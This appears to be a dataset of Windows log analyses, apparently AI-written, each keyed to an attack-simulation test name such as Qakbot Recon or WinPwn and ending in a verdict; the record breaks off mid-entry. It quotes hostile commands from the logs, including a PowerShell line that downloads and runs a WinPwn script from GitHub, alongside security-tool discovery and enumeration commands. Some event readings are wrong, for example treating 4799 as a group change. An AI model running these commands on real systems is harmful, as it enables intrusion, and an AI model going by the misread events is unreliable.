System Time Discovery - PowerShell,"To provide an analysis of the provided Windows logs, several aspects need to be examined to identify any suspicious or potentially malicious activities.

1. **Unusual Process Execution and Privilege Escalation:**
   - The logs show multiple instances of standard system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` executed by the user `SERVER002\admin_test`. These executions occurred in rapid succession around `2024-10-25 10:39:19`, which isn't inherently suspicious but warrants attention if these processes were not expected to run.
   - The execution of `powershell.exe` with a simple command to get the date suggests normal administrative or scripting activity. However, the context in which it was executed, alongside other system utilities, raises a slight flag.
   - `wevtutil.exe` and `conhost.exe` are commonly used in various legitimate administrative operations. However, their usage repeatedly and in conjunction with other command-line utilities may imply a script or batch operation.

2. **Service and Software Update Activities:**
   - The logs contain entries for `Microsoft Edge Update` service executions, which are benign activities related to software updates. This may explain the `Service stopped` and subsequent activities of Microsoft Edge Update services seen in the application logs.
   - The logs don't indicate any unusual command-line arguments or execution paths that typically accompany malicious uses of these services.

3. **Level of Access and User Activities:**
   - Most process executions and operations are tied to the user `SERVER002\admin_test` and is characterized by a High Integrity Level, indicating administrative access.
   - Activities were also performed by `NT AUTHORITY\SYSTEM`, which is typical for background services and tasks handled by the Windows Operating System and service providers like `svchost.exe` for services.

4. **Time Synchronization and System Activity:**
   - Time changes recorded within the security and system logs (`EventID: 4616`) correspond with routine system time synchronization activities with `time.windows.com`. These events are logged as part of service operations and do not signify compromise.

5. **Potential Indicators of Malicious Activity:**
   - No explicit actions such as privilege escalation, unexpected remote command execution, or alterations to system critical files were evident. 

Based on the logs provided and understanding typical administrative operations and systems processes, no concrete evidence points to a definitive intrusion or compromise. The prevalent usage of legitimate system binaries in expected locations without suspicious command-line parameters reduces the likelihood of sophisticated malware activities such as `Living off the Land`.

### Conclusion:
Therefore, after carefully reviewing the logs provided, the activity observed seems to align more closely with regular system maintenance tasks rather than overtly suspicious or malicious acts. The activities detailed in the logs are `BENIGN` given the lack of clear deviations from expected behavior or indicators of compromise. However, if these logs represent unusual patterns for the specific environment or user, it might necessitate a closer inspection of system context and user actions during the logged time period as a precaution."
Windows Internal pktmon capture,"In reviewing the provided Windows event logs, I've identified some noteworthy points that may indicate suspicious behavior:

1. **Software Protection Platform Log (Application log):**
   - The log entry from the Software Protection Platform seems unrelated to suspicious activities. It's a regular log regarding software protection.

2. **Sysmon Logs:**
   - There are repeated invocations of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` by `SERVER002\admin_test`. Both `wevtutil` and `conhost` are legitimate Windows utilities. However, the frequency and pairing of these process calls can sometimes be abused for manipulating event logs or executing commands under certain contexts.

3. **Command-line Executions:**
   - The execution of `cmd.exe` with the command `pktmon.exe start --etw -f %%TEMP%%\data.etl & TIMEOUT /T 5 >nul 2>&1 & pktmon.exe stop` is logged. `pktmon.exe` is a legitimate network diagnostics log tool that Microsoft provides, often used to capture network packets. While legitimate, its uncued usage in logs without a known operational reason can sometimes be suspicious, especially when run from `cmd`. The complexity and timing of this command can suggest scripted or automated behavior, often worth further scrutiny.
  
4. **High Integrity Processes:**
   - There are several processes running at a high-integrity level, which indicates administrative privileges. This includes `hostname.exe`, `whoami.exe`, `cmd.exe`, `timeout.exe`, and `pktmon.exe`. While most are benign system operations or basic diagnostic commands, the elevated privileges usage by `admin_test` should be investigated for its context, especially the combination with `pktmon`.

5. **Privilege Details (Security log):**
   - The user `admin_test` is assigned several high-level privileges, such as `SeDebugPrivilege`, which can be used to debug and tamper with system processes. Admin level activities, specifically with debug privileges, are typically not used in legitimate day-to-day administrative tasks.

6. **Processes Executed with NT AUTHORITY\SYSTEM:**
   - Several processes related to updating Microsoft Edge are executed in the context of `NT AUTHORITY\SYSTEM`. This matches expected behavior during legitimate update processes but warrants verification to ensure these processes weren't exploited.

**Assessment:**
- **SUSPICIOUS**: The logs contain multiple legitimate operations, but their combination and execution raise a few red flags, particularly with the use of `pktmon` and elevated privileges assigned to `admin_test`. Such command line operations should typically be justified in an enterprise environment.

**Guidance:**
- Verify with IT operation teams the legitimacy of `admin_test` actions, especially regarding the network packet capturing activity.
- Conduct a thorough review to ensure `pktmon.exe` activity is aligned with organizational policies and documented network diagnostics; also ensure there is no data exfiltration.
- Confirm administrative rights, set accurately, and ensure the principle of least privilege is applied. Familiarize yourself with any automation tools (if any) the environment typically uses that might account for the packet capture.

Further investigation would help clarify intentions and legitimacy, assuring network and system integrity."
Griffon Recon,"Upon reviewing the provided Windows event logs from the Security, System, Sysmon, and Application logs, the following observations can be made:

### Suspicious or Anomalous Behavior:
1. **PowerShell Execution**:
   - There are repeated PowerShell executions with the command line `powershell.exe & {cscript ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\griffon_recon.vbs""}`. The usage of PowerShell to invoke a VBScript, especially in a temporary directory, is suspicious as this combination is often seen in malicious activities like reconnaissance scripts executed by malware or by an attacker gaining initial access.

2. **VBScript Execution with cscript.exe**:
   - Following the PowerShell command, the logs indicate the execution of `cscript.exe` to run the VBScript `griffon_recon.vbs` located in the temporary directory. The naming (`griffon_recon.vbs`) suggests reconnaissance, which is often part of a preparatory stage for a potential attack.

3. **Process Execution and Integrity Level**:
   - The execution of `cscript.exe` and other Windows system utilities like `whoami.exe` and `hostname.exe` under a high integrity level could be a sign of privileged activity, which can be risky if not initiated by a legitimate user.
   
4. **Sysmon Logs**:
   - The Sysmon logs show multiple process creation events involving key Windows utilities (`powershell.exe`, `cscript.exe`, etc.) executed by the `SERVER002\admin_test` user, which could indicate suspicious behavior if the account is compromised.
   - The repeated execution of Microsoft Edge Update processes with high integrity suggests legitimate software updates but could also be leveraged for privilege escalation if tampered with.

### Indicators of Malicious Activity or Compromise:
- The combination of PowerShell invoking a VBScript from a temporary directory strongly suggests malicious scripting activity aimed at gathering system information or laying groundwork for further attacks.
- The use of `cscript.exe` to execute a script named `griffon_recon.vbs`, especially given the context of `PowerShell` usage and invocation through a high integrity level user account, aligns with potentially malicious reconnaissance efforts.

### Recommendation and Resolution:
Given the findings:

1. **Resolution**: **MALICIOUS**
   - The activity observed points to the execution of potentially malicious scripts which are often used in reconnaissance for further compromising the system. The execution patterns are typical of initial stages of a cyber attack.

2. **Guidance on How to Proceed**:
   - Conduct a forensic analysis of the `griffon_recon.vbs` script to understand its full functionality and impact.
   - Review and monitor accounts and sessions associated with `SERVER002\admin_test` for unauthorized access or abnormal behavior.
   - Perform a thorough security audit of the affected systems to identify any further compromises or vulnerabilities.
   - Consider isolating the host from the network to prevent potential spread or further command and control activities.
   - Update and confirm the presence and function of security tools, including endpoint protection, to intercept similar threats in the future."
Windows - Discover domain trusts with nltest,"### Detailed Analysis

Upon reviewing the provided Sysmon log details, several entries suggest behaviors that could warrant further investigation for potential indications of suspicious activity. The focus of the analysis includes unusual command and process execution patterns observed:

1. **Command Execution with High Integrity Level:**
   - Multiple instances of `cmd.exe` execution were observed. Notably:
     - The command `cmd.exe /c WHERE nltest.exe >NUL 2>&1` was executed.
     - `cmd.exe /c nltest /domain_trusts & nltest /trusted_domains` was executed.
   - Both commands relate to network testing and querying trusted domains, which can be used in legitimate network administration or could be utilized in lateral movement and domain trust enumeration within a compromised environment.

2. **System Utilities Execution:**
   - `wevtutil.exe` was executed multiple times. This utility can be used to query Windows Event logs, possibly aiming to clear or reduce traces of malicious activity.
   - `whoami.exe` was also executed, which is normally used to identify the currently logged-on user and could be part of a script testing user privileges.
   - The presence of multiple `conhost.exe` instances is typical since this process hosts console windows for command-line processes.

3. **Service Stopping Logs in the Application Log:**
   - There were two logs with the message “Service stopped” from `edgeupdate`. While stopping services can be part of normal operations, repeated stop logs in a short timeframe might indicate potential tampering via scripted or automated means for disabling or managing service execution state.

4. **Microsoft Edge Update Activity:**
   - Entries related to Microsoft Edge update processes (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup.exe`, etc.) were frequent. Such processes are normal for system updates but are notable for their volume and the use of temporary directories for execution (e.g., `C:\\Program Files (x86)\\Microsoft\\Temp\\...`).
   - This activity largely consolidates into automated browser update behaviors; however, excessive and frequent execution might necessitate a closer look to ensure no malicious use.

### Assessment

The log entries collectively highlight behaviors potentially aligned with initial access, enumeration, and evasion tactic phases as seen in certain attack strategies. However, none explicitly confirms malicious activities. Factors like the use of high-integrity cmd.exe execution, system utilities querying domain trusts, and service alterations suggest the need for further inquiry.

### Resolution

- **SUSPICIOUS**: The behavior seen in the logs indicates potentially suspicious activities that could be linked to intrusion scenarios, specifically regarding network enumeration and possible cleanup attempts via event utilities. While there is no definitive evidence of malicious activity in the logs, the execution patterns warrant closer scrutiny.

### Guidance

1. **Investigate `cmd.exe` Activities:**
   - Verify if commands executed through cmd.exe were authorized and align with scheduled administrative tasks.
   - Check for any correlated logs indicating unauthorized access or privilege escalation.

2. **Examine Service Management:**
   - Look into the repeated service stop logs for `edgeupdate` to identify any discrepancies or unauthorised service changes.

3. **Review Account Activities:**
   - Examine user accounts (specifically `SERVER002\\admin_test`) for unusual activity such as unexpected login times or access from unusual locations.

4. **Evaluate System Patch and Update Activities:**
   - Confirm if the Microsoft Edge update processes were legitimate by reviewing update history logs for the operating system.

5. **Conduct Network and Host Baseline Checks:**
   - Implement logging of network connections on monitored processes.
   - Compare current configurations and active processes against known baselines for anomaly detection. 

Depending on findings from the extended investigation, adjust containment and remediation steps as necessary."
Permission Groups Discovery PowerShell (Local),"Based on the analysis of the provided Windows event logs, several entries point towards potentially suspicious activity that requires further investigation:

1. **Time Manipulation**:
   - Security Event ID 4616 indicates that the system time was changed. This activity can be suspicious if unexpected or not performed by a legitimate system administrator, as time changes can be utilized to mask actions or manipulate logs.

2. **Privilege Escalation**:
   - Security Event ID 4672 shows that the user ""admin_test"" was granted special privileges such as SeDebugPrivilege, SeTakeOwnershipPrivilege, SeBackupPrivilege, etc. These are powerful privileges that should be monitored closely, especially if they are not expected for the user in question.

3. **Network Logon with High Privileges**:
   - Security Event ID 4624 and Event ID 4672 show a network logon (Logon Type 3) for the user ""admin_test"" with high privileges, including SeDebugPrivilege. Network logons with high privileges should be scrutinized, particularly if they are not typical for the user or occur outside normal working hours.

4. **PowerShell Execution**:
   - Sysmon logs and PowerShell logs show the execution of PowerShell commands that involve querying local group members (""get-localgroup, Get-LocalGroupMember -Name \""Administrators\""""). The use of PowerShell to query local administrators could be a reconnaissance action prior to privilege escalation or other operations.

5. **Frequent Use of Utilities**:
   - The logs show frequent invocation of system utilities like `whoami.exe`, `hostname.exe`, `wevtutil.exe`, and `conhost.exe` by the ""admin_test"" user in a short period. While these are legitimate system binaries, their rapid and repeated execution might indicate a script or automated process, potentially used for enumeration or other malicious activities.

6. **Multiple Privilege Modifications**:
   - Event ID 4799 logged multiple modifications to built-in user groups using `PowerShell.exe`, suggesting the user ""admin_test"" might be attempting to adjust user group memberships for lateral movement or persistence.

7. **Application and System Behavior**:
   - Application events note the stopping of the ""edgeupdate"" service, which could relate to software update activities. While not inherently suspicious, stopping services can sometimes be used to prepare the ground for other actions.

**Assessment and Resolution**:
The behavior observed in these logs, particularly the privilege escalation, manipulation of built-in groups, and PowerShell usage, align with potential reconnaissance or lateral movement activities often associated with malicious actions. However, without additional context confirming malicious intent, such as unauthorized changes or external threat indicators, it remains labeled as suspicious.

**Recommendation**:
- Further investigation into the user ""admin_test"" is required. Confirm their expected behavior and access rights.
- Review the system's change management logs to validate the legitimacy of the time changes.
- Monitor the system for any further suspicious behavior from this user, especially involving changes to privileges or group memberships.
- Conduct a cross-reference with known threat intelligence to identify any matching TTPs (Tactics, Techniques, and Procedures).

**Resolution**: SUSPICIOUS - Requires further investigation."
Remote System Discovery - arp,"Upon reviewing the provided event logs from the Windows machine, here's a comprehensive analysis and assessment:

### Key Observations:

1. **Sysmon Logs:**
   - **WMI Provider Host Execution**:
     - `WmiPrvSE.exe` is a legitimate Windows process responsible for managing WMI operations. Its execution under `NT AUTHORITY\SYSTEM` at a high integrity level is typical. There is no immediate indication that this is malicious.
   - **Frequent Execution of `wevtutil.exe` and `conhost.exe`**:
     - Observed several instances where `wevtutil.exe` (Windows Events Command Utility) and `conhost.exe` (Console Window Host) are executed by the user `SERVER002\admin_test`. While usage of `wevtutil.exe` can be associated with log management (viewing, querying, or clearing logs), the reason for its frequent execution needs more context. It's unusual but not inherently malicious.
   - **`cmd.exe` Execution with Network Commands**:
     - `cmd.exe` executed with the command `/c arp -a`. The use of ARP could indicate network reconnaissance activity, especially when initiated under a high integrity level by an admin user. This might be benign depending on the context, but suspicious if unexpected.

2. **System Logs:**
   - **Time Change Event**:
     - There are events indicating a change in system time (`EventID 4616`). While time changes can happen for legitimate reasons (such as synchronization with a time server), it can also be used by malicious actors to circumvent certain log timestamps. Further context is required.
   - **Windows Update Activity**:
     - The logs highlight activity related to the downloading and installation of updates, specifically for Microsoft Defender. This appears benign and typical of regular update operations.

3. **Security Logs:**
   - **Successful Login Events**:
     - `admin_test` logged in successfully with elevated privileges (several privileged rights are listed). While having administrative privileges is typical for system administrative accounts, this needs verification if `admin_test` should indeed have such broad rights.
   - **Repeated Audit Failure (`EventID 5379`)**:
     - Several failed read operations related to MicrosoftAccount credentials. While the failure in itself is not conclusive of malicious activity, the frequency of such audit failures can indicate misconfigured services or unsuccessful attempts to access certain resources.

### Threat Assessment:

- **BENIGN**: The operations related to system updates and legitimate processes like `WmiPrvSE.exe`, `wuauclt.exe`, and update-related actions are typical for daily operations.
  
- **SUSPICIOUS**: There is suspicious behavior surrounding the frequent use of `wevtutil.exe` alongside `cmd.exe` for network-related commands (`arp -a`) executed by `admin_test`. These actions could either be part of a legitimate administrative task or indicative of reconnaissance behavior consistent with malicious intent.

- **MALICIOUS**: No clear indication of confirmed malicious activity is present in the logs.

### Recommendation:

- **Resolution**: SUSPICIOUS
  - **Next Steps**:
    - Conduct a deeper investigation into the activities performed by `SERVER002\admin_test`. Verify if the uses of `wevtutil.exe` and `cmd.exe` match authorized administrative activities.
    - Check with relevant personnel or system documentation to confirm the necessity and purpose of these actions.
    - Monitor the system closely for any further unusual behavior and ensure logging is appropriately capturing all critical events for analysis.
    - Review and audit the privileges assigned to `admin_test` to ensure they align with the principle of least privilege.

This assessment highlights the importance of situational context in log analysis to distinguish between routine activities and potential security incidents."
Security Software Discovery - powershell,"Upon reviewing the provided log entries across various event sources, a few items stand out that merit further examination:

### Suspicious PowerShell Activity

1. **PowerShell Commands:**
   - There are multiple instances of the same PowerShell commands being run in the provided logs. These commands attempt to identify running processes through PowerShell by filtering descriptions and process names with terms like ""virus,"" ""carbonblack,"" ""defender,"" ""cylance,"" ""mc,"" and ""Sysmon.""
   - The commands appear as follows:
     ```powershell
     get-process | ?{$_.Description -like ""*virus*""}
     get-process | ?{$_.Description -like ""*carbonblack*""}
     get-process | ?{$_.Description -like ""*defender*""}
     get-process | ?{$_.Description -like ""*cylance*""}
     get-process | ?{$_.Description -like ""*mc*""}
     get-process | Where-Object { $_.ProcessName -eq ""Sysmon"" }
     ```
   - This kind of activity indicates a reconnaissance attempt to detect security software or monitoring tools like Sysmon, which could suggest malicious intent, such as disabling or avoiding specific monitoring practices.

### System and Security Logs

1. **Time Manipulation:**
   - The system and security logs indicate that the system time was adjusted backward by the process `svchost.exe`. This action is sometimes an attempt to confuse event timelines, potentially indicating malicious activity trying to evade detection.

### Sysmon Logs

1. **Frequent Process Activity:**
   - At a high frequency, processes like `whoami`, `hostname`, `conhost`, and `wevtutil` are run.
   - `wevtutil.exe` is used primarily for managing event logs, and frequent invocations can indicate attempts to clear logs or extract specific entries.
   - Repeated initiation of different processes from common system utilities in a short timeframe can be suspicious in investigative contexts, particularly if these processes are child processes of `wsmprovhost.exe`, which can be involved in PowerShell remote management.

### Edge Update Activity

1. **Microsoft Edge Update:**
   - Multiple entries show that `MicrosoftEdgeUpdate.exe` was executing various commands in a short span of time. While legitimate in some contexts, if this update process was unsolicited or not expected, it could indicate malicious use or masquerading.

### Assessment

Based on the logs and the variety of activities, notably the repeated and focused PowerShell commands attempting to identify security tools, backward time setting, and the pattern of process creation and stopping activities, there are significant indicators that warrant concern. While the activities do not undoubtedly confirm malicious intent, they are highly suspicious and possibly indicate a compromise or attempted compromise.

### Resolution

**SUSPICIOUS** - The behavior observed in the logs is anomalous and suggests reconnaissance or even malicious intent to identify and potentially disable security measures. Further in-depth analysis is recommended, including:

- Verifying the necessity and legitimacy of the PowerShell commands executed.
- Investigating why the time was changed and whether any processes attempt to evade detection.
- Inspecting network traffic for any unexplained connections or data flows.
- Reviewing process lineage and relationships for anomalies indicative of lateral movement or data exfiltration.

Engage further monitoring, enhance logging, and consider an incident response if this environment contains sensitive information or business-critical services."
List Google Chrome - Edge Chromium Bookmarks on Windows with command prompt,"Based on the provided Windows event log entries, the following analysis identifies potential threats or anomalous behaviors:

1. **Sysmon Log Analysis:**
    - Several instances involve the execution of utilities like `whoami.exe` and `hostname.exe`, which could indicate a routine system check or an intruder verifying user and hostname details. These processes are executed from `wsmprovhost.exe`, which is a legitimate process, and the execution happened with a user context of `admin_test` with a high integrity level. 
    - The execution of `cmd.exe` with the command `where /R C:\Users\ Bookmarks` seems peculiar. This action of searching user directories is indicative of an attacker trying to find specific files, potentially a sign of reconnaissance activity.
    - Multiple executions of `wevtutil.exe` from `admin_test` account, aiming to potentially read or alter event logs. This behavior can be aligned with log manipulation attempts by malicious actors to cover their tracks.
    - Legitimate system updates are occurring, as seen with processes like `MicrosoftEdgeUpdate.exe` and `Windows Update` related processes, executed under the NT AUTHORITY\SYSTEM context, which do not raise immediate red flags on their own.
    - Windows Defender related activities indicate that the system's antivirus is active, which is a positive sign in terms of defensive measures.

2. **Application Log Analysis:**
    - The logs show the Windows Defender in `SECURITY_PRODUCT_STATE_ON` which confirms it is enabled.
    - The `edgeupdate` service stops at multiple points, which seems routine as these services usually stop after performing updates. However, stopping during suspicious activity could be worth further investigation.

3. **System Log Analysis:**
    - Time synchronization events are logged, indicating the machine's time was updated through the NTP service `time.windows.com`. This is a normal system behavior and should not raise concern unless manipulated time changes are detected in conjunction with suspicious activities.

4. **Security Log Analysis:**
    - The logs show time change events which match the system and security logs regarding time synchronization; thus, these entries are benign when correlated with other legitimate system activities.

**Assessment:**
Due to the presence of typical system administrative tools used in suspicious manners, such as searching user-specific directories and executing event utility commands with potential risks of event log tampering, these logs present indicators of potential misuse. However, without direct evidence of exploitation, it is unclear if these actions were authorized or part of a malicious sequence. 

**Resolution:**
- **SUSPICIOUS**: The behavior detected, particularly related to the command line usage by `admin_test` and `wevtutil.exe`, is unusual and warrants further investigation. The activity could be legitimate but poses potential risks that should be evaluated more in-depth to confirm whether these actions were authorized by the user or indicative of a compromise.

**Guidance:**
- Conduct a deeper investigation into the `admin_test` account to determine the legitimacy of their activities during the period of concern.
- Review user access controls and ensure strong authentication measures are in place.
- Analyze additional logs or conduct a broader assessment on this and related systems to identify any overlooked anomalies or escalation sequences.
- Consider improving logging and alerting mechanisms to capture further detailed activity, including PowerShell cmdlets that may not have been logged due to their omission from available logs."
Basic Permission Groups Discovery Windows (Local),"Upon analyzing the provided Windows event logs, several events stand out that may indicate suspicious or potentially malicious behavior. Here is a detailed analysis:

### Key Observations:

1. **Unusual Use of Command-Line Utilities:**
   - In the Sysmon logs, several command-line utilities such as `whoami.exe`, `HOSTNAME.EXE`, `wevtutil.exe`, and `cmd.exe` are executed in a rapid succession by the user `SERVER002\admin_test`. These could be indicative of reconnaissance or system enumeration activities.
   - The `cmd.exe` is run with the command line `""cmd.exe"" /c net localgroup & net localgroup ""Administrators""`, which could suggest attempts to enumerate or manipulate local group memberships, potentially for privilege escalation.

2. **Modification of Group Membership:**
   - An event from the Security log (EventID: 4799) shows the `net1.exe` utility being used by `admin_test` to potentially interact with the `Administrators` group. This is a common indicator of privilege escalation attempts if the account does not typically have these privileges.

3. **Time Manipulation:**
   - There are events in the Security log (EventID: 4616) indicating changes to the system time. Altering system time can sometimes be used by attackers to evade detection or manipulate logs.

4. **Repeated Edge Update Service Events:**
   - The application and Sysmon logs contain many entries related to Microsoft Edge Update processes being executed with system authority. Frequent starting and stopping of these processes could be routine, but they might also be leveraged by attackers to disguise malicious activity or persistence mechanisms.

### Assessment:

Based on these observations, the sequence of executions in such close temporal proximity and the types of actions being conducted raise concern for potentially malicious activities. Especially, the manipulation or attempt to interact with the Administrators group, alongside the system time modification, suggests that there is an effort to escalate privileges or otherwise disrupt normal monitoring.

### Resolution:

- **Resolution:** **SUSPICIOUS**

### Guidance on How to Proceed:

1. **Immediate Isolation and Monitoring:**
   - Consider isolating the affected machine, `Server002`, from the network to prevent further suspicious activities.
   - Increase monitoring on the specific user account `admin_test` and other accounts with elevated privileges.

2. **In-Depth Investigation:**
   - Conduct a full forensic investigation on `Server002` to determine the origin of these suspicious commands, including reviewing additional logs, checking for unauthorized file modifications, and verifying all accounts and group memberships.
   - Review recent changes in system configurations, installed software, and any other potentially malicious artifacts.

3. **Verify and Remediate:**
   - Confirm whether modifications to the group memberships occurred and rollback any unauthorized changes.
   - Ensure that the system time has been corrected and review related logs to ensure no important events have been obscured or misrepresented.
   - Update and strengthen security measures, such as employing stricter group policies and ensuring all updates are applied.

4. **User Awareness and Training:**
   - Provide awareness training to employees, emphasizing the importance of security policies and best practices, especially around privileged command-line usage. 

This approach ensures that any potential threats are understood and mitigated, while also protecting the wider network environment from similar activities in the future."
WinPwn - Powersploits privesc checks,"After thoroughly analyzing the provided Windows event logs, several indicators point to potentially malicious activity:

1. **PowerShell Activity**: The PowerShell logs show the execution of a script downloaded from a GitHub repository (S3cur3Th1sSh1t/WinPwn). The use of PowerShell to download and execute scripts from an external source is a common technique used in post-exploitation activities. The particular script appears to be executed with elevated privileges and could lead to system compromise if the contents of the script are malicious.

2. **Command Line Usage**: The invocation of PowerShell with command-line arguments that download and execute a script on the machine is suspicious. This activity suggests an attempt to execute potentially harmful commands or payloads.

3. **System Integrity Concerns**: Files such as PowerShell.exe are being used with high integrity levels, and the scripts are downloaded into temporary directories, which is often seen in attack scenarios where processes attempt to evade traditional security controls or logging mechanisms.

4. **Sysmon Logs**: The Sysmon logs corroborate the timeline and activity seen in the PowerShell logs. They reveal the invocation of PowerShell and the download string used, aligning with common indicators of compromise related to execution from a temp directory.

5. **Parent Process Relationships**: Observations in the process creation patterns where explorer.exe spawns unexpected PowerShell activities could suggest unauthorized or hidden activities aiming at process masquerading which is often observed during malicious activities.

Based on these findings and the analysis of the behavior and context provided in the logs, there are sufficient indicators suggesting potentially malicious activity that warrants a thorough investigation.

**Resolution: MALICIOUS**

**Guidance and Next Steps**:
1. **Isolate the System**: Immediately isolate the system (Server002) from the network to prevent potential lateral movement or data exfiltration by the attacker.
2. **Forensic Analysis**: Preserve the system's state and data for a comprehensive forensic analysis. Examine the contents of the downloaded script from the GitHub repository to determine its intent and effect.
3. **Review Security Controls**: Evaluate the organization's current security controls related to script execution policies, especially in regards to PowerShell, and consider implementing restrictive execution policies.
4. **Threat Hunting**: Conduct wider threat hunting in the organization for similar indicators of compromise, focusing on PowerShell logs and integration with command control communications.
5. **Increase Monitoring**: Enhance monitoring of PowerShell activities, network traffic towards known repositories hosting exploit or malware-related scripts, and the use of admin-level accounts in unusual contexts."
WinPwn - itm4nprivesc,"**Analysis of the Windows Event Logs:**

Upon reviewing the provided logs, several aspects and patterns are notable:

1. **Time Synchronization Events (System and Security logs):**
   - The logs indicate time synchronization events handled by `svchost.exe` associated with the `Microsoft-Windows-Time-Service`. These events typically update the system clock using an external time source (time.windows.com). This is standard system behavior to maintain accurate time synchronization and does not indicate malicious activity.

2. **Process Execution (Sysmon and PowerShell logs):**
   - The Sysmon logs show execution of various native Windows processes such as `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe`, which by themselves aren’t inherently suspicious. However, these processes are executed by the user `SERVER002\\admin_test`, which requires further scrutiny on the specific context but isn't directly alarming without further context.
   - A PowerShell script is executed with a potentially suspicious command line: `""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')}`. This script attempts to download and execute content from an external repository, which is a known malicious action without prior authorization or context suggesting benign purposes.

3. **Malicious Patterns (Sysmon and PowerShell logs):**
   - The PowerShell logs exhibit execution of a command designed to download and execute a potentially malicious script from the internet. This technique is commonly used for privilege escalation and unauthorized access within a compromised system, specifically by leveraging PowerShell to execute payloads in-memory.

4. **System and Application Logs:**
   - The logs pertaining to Windows Defender indicate that security products are active (`SECURITY_PRODUCT_STATE_ON`). However, the presence of active security software doesn't negate the suspicious activity of executing potentially harmful PowerShell scripts.

**Assessment:**

- **PowerShell Command Execution**: The usage of `Invoke-Expression (iex)` coupled with downloading a PowerShell script from a GitHub repository associated with potential attack tools (WinPwn) is highly indicative of malicious intent. This aligns with common tactics used in exploitation frameworks for elevating privileges or establishing a foothold within a system.

**Resolution: MALICIOUS**

- Given the execution of a PowerShell script that downloads and likely executes potentially harmful code from a known public repository without clear benign purposes, this activity can be classified as MALICIOUS. This suggests unauthorized or harmful use of the host system resources, potentially leading to further exploitation.

**Guidance on How to Proceed:**

1. **Immediate Containment**: Isolate the host (Server002) from the network to prevent potential lateral movement or further compromise.
2. **Conduct a Comprehensive Investigation**:
   - Review all PowerShell execution and command histories on the system to identify the source of execution and potential spread.
   - Assess any persistence mechanisms introduced by the script.
3. **Forensic Examination**:
   - Capture and preserve the current state of the system for forensic analysis.
   - Investigate any connections or communications made by the PowerShell script using network logs.
4. **Threat Mitigation**:
   - Strengthen security configurations around PowerShell, such as enabling script-block logging, enforcing execution policies, and monitoring outbound connections.
   - Ensure all systems are updated with the latest security patches.
5. **User Education & Policy Enforcement**:
   - Educate system administrators and users about the risks associated with downloading and executing scripts from unverified sources.
   - Implement and enforce policies to restrict the use of administrative tools and scripting languages to authorized personnel only."
Qakbot Recon,"### Detailed Log Analysis

#### Security Log

1. **Event ID 4672 and 4624 (Special Privileges & Logon)**:
   - The user `admin_test` is frequently granted high-level privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, etc.). The account has made network logons (`LogonType 3`) from an NTLM authentication source over IP addresses such as `192.168.0.102` and `fe80::e3b5:5371:12a8:9c77`. Such activities suggest administrative activities, but could also be part of lateral movement when done excessively by a user not typically seen with such access. The use of `NTLM` (especially NTLM V2) could indicate potential credential forwarding attempts or exploitation attempts if not routine practice.

2. **Event ID 4634 (Logoff)**:
   - A normal logout event for `admin_test`, correlating with the logon events, seems to be a part of cyclic activities.

3. **Event ID 4799 (Group Membership Changes)**:
   - A change involving the `Users` group wasn't elaborated on in detail within the logs' timestamp range. If this was unauthorized, it could mean attacker foothold seeking lower-level persistence.

4. **Event ID 5379 (Credential Validation)**:
   - This event, repeatedly failing with `ReturnCode 3221226021`, indicates failed validation for MicrosoftAccount/WindowsLive tokens. Could be a misconfiguration/search attempt for stored credentials.

#### System Log

1. **Windows Update Events (Event ID 44, 43, 19)**:
   - The log records Microsoft Defender Antivirus updates, and they align with legitimate system maintenance activities. 

#### Sysmon Log

1. **Event ID 1 and 5 (Process Creation and Termination)**:
   - A number of utilities such as `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `whoami.exe`, and various `net` and other command-line tools are executed by the `admin_test` account. Notably, `cmd.exe` was employed to execute a batch file named `qakbot.bat` located in a temporary directory: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\qakbot.bat`. The presence of `qakbot.bat` is particularly concerning since ""Qakbot"" refers to a notorious banking Trojan, typically related to data theft and lateral movement within networks.

2. **Microsoft Edge Installer Executions**:
   - Multiple executions of Microsoft Edge Installer (`setup.exe`) were noted. This could be part of legitimate application update processes.

### Assessment and Identified Threats

The presence of a suspiciously named batch script `qakbot.bat`, coupled with excessive administrative command line tool usage by the `admin_test` account, raises significant red flags. The behavior is consistent with post-exploit activity where a potential attacker explores the compromised system and network.

### Resolution: MALICIOUS

**Threats/Risks Identified**:
- The detection of potentially malware-related scripting aligned with known threats (i.e., potential Qakbot infection) is a severe indicator of compromise.
- The excessive use of administrative tools and privileges indicates potential abuse or compromise of the `admin_test` account.
  
**Guidance/Next Steps**:
1. **Immediate containment**: Disconnect the affected system (Server002) from the network to prevent lateral movement or data exfiltration.
2. **Malware Analysis**: Examine the content of `qakbot.bat` and other suspicious files/scripts using a secure, isolated environment.
3. **Credential Audit**: Evaluate and reset passwords for accounts with administrative access, especially `admin_test`.
4. **Incident Response**: Engage incident response procedures to assess the extent of the breach, including checking for lateral movements in other systems.
5. **Update Security Measures**: Ensure all endpoints are updated with the latest security patches and antivirus definitions to prevent future incidents.
6. **User Education**: Reinforce security awareness about phishing and credential security, to prevent initial compromise vectors."
Automated AD Recon (ADRecon),"After reviewing the provided logs from the Windows host, here is a thorough analysis of the events captured:

1. **Security Logs:**
   - The logs indicate multiple registration events (Event ID 4672) where privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` were assigned, typically indicating a system-level process initiation. However, these events appear normal given the `SYSTEM` account usage, perhaps during system updates or configurations.
   - Events with IDs 4624 indicate successful logons using the `Advapi` logon process which can occur during legitimate administrative tasks.
   - Multiple Event ID 5379 refer to operations around credential reading attempts with failure return codes, suggesting possible failed attempts to access certain credentials. This might suggest either a misconfiguration or attempts by unauthorized scripts or applications.

2. **Windows PowerShell Logs:**
   - PowerShell was executed with the command invoking `ADRecon.ps1`, a well-known Active Directory reconnaissance script. This usage is suspicious as `ADRecon.ps1` is typically leveraged for gathering extensive information on Active Directory environment structures and permissions.

3. **Sysmon Logs:**
